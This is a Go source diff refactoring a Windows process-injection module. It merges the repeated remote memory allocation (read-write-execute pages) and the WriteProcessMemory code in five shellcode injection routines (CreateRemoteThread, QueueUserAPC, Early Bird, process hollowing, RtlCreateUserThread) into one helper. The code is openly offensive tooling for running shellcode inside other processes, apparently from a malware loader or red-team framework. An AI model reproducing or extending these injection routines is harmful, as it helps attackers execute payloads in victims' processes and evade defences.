@@ -135,26 +135,9 @@ func (w *windowsInjector) injectCreateRemoteThread(shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	addr, _, err := api.ProcVirtualAllocEx.Call(
-		uintptr(hProcess),
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-	)
-	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx failed: %w", err)
-	}
-
-	err = windows.WriteProcessMemory(
-		hProcess,
-		addr,
-		&shellcode[0],
-		uintptr(len(shellcode)),
-		nil,
-	)
+	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
 	if err != nil {
-		return fmt.Errorf("WriteProcessMemory failed: %w", err)
+		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
 
 	hThread, _, err := api.ProcCreateRemoteThread.Call(
@@ -266,26 +249,9 @@ func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	addr, _, err := api.ProcVirtualAllocEx.Call(
-		uintptr(hProcess),
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-	)
-	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx failed: %w", err)
-	}
-
-	err = windows.WriteProcessMemory(
-		hProcess,
-		addr,
-		&shellcode[0],
-		uintptr(len(shellcode)),
-		nil,
-	)
+	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
 	if err != nil {
-		return fmt.Errorf("WriteProcessMemory failed: %w", err)
+		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
 
 	// Find all threads of the target process
@@ -361,28 +327,10 @@ func (w *windowsInjector) injectEarlyBird(shellcode []byte) error {
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
-	addr, _, err := api.ProcVirtualAllocEx.Call(
-		uintptr(pi.Process),
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-	)
-	if addr == 0 {
-		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("VirtualAllocEx failed: %w", err)
-	}
-
-	err = windows.WriteProcessMemory(
-		pi.Process,
-		addr,
-		&shellcode[0],
-		uintptr(len(shellcode)),
-		nil,
-	)
+	addr, err := allocateAndWriteMemoryRemote(pi.Process, shellcode)
 	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("WriteProcessMemory failed: %w", err)
+		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
 
 	apcRet, _, _ := api.ProcQueueUserAPC.Call(
@@ -436,28 +384,10 @@ func (w *windowsInjector) injectProcessHollowing(shellcode []byte) error {
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
-	addr, _, err := api.ProcVirtualAllocEx.Call(
-		uintptr(pi.Process),
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-	)
-	if addr == 0 {
-		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("VirtualAllocEx failed: %w", err)
-	}
-
-	err = windows.WriteProcessMemory(
-		pi.Process,
-		addr,
-		&shellcode[0],
-		uintptr(len(shellcode)),
-		nil,
-	)
+	addr, err := allocateAndWriteMemoryRemote(pi.Process, shellcode)
 	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("WriteProcessMemory failed: %w", err)
+		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
 
 	var ctx context64
@@ -505,26 +435,9 @@ func (w *windowsInjector) injectRtlCreateUserThread(shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	addr, _, err := api.ProcVirtualAllocEx.Call(
-		uintptr(hProcess),
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-	)
-	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx failed: %w", err)
-	}
-
-	err = windows.WriteProcessMemory(
-		hProcess,
-		addr,
-		&shellcode[0],
-		uintptr(len(shellcode)),
-		nil,
-	)
+	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
 	if err != nil {
-		return fmt.Errorf("WriteProcessMemory failed: %w", err)
+		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
 
 	var hThread uintptr
